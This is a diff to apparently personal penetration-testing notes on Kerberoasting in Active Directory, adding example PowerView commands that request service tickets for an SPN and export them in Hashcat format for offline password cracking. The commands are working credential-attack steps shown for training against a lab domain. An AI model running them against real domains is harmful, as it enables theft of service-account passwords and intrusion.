@@ -27,7 +27,6 @@ tags:
 	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)
 
 
-
 ## 🔐 Kerberoasting 
 
 [See about Kerberos authentication](kerberos-authentication.md).
@@ -142,9 +141,14 @@ Get-NetUser -SPN
 ```powershell
 # Option 1
 Get-DomainUser -Identity $samAccountName | Get-DomainSPNTicket -Format Hashcat
+# Example: 
+# Get-DomainUser -Identity MSSQLSvc/SQL01.inlanefreight.local:1433 | Get-DomainSPNTicket -Format Hashcat
+
 
 # Option 2
 Get-DomainSPNTicket -SPN $samAccountName -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
+# Example: 
+# Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt
 ```
 
 **3.** Or obtain all SPN TGS tickets and export them to a CSV
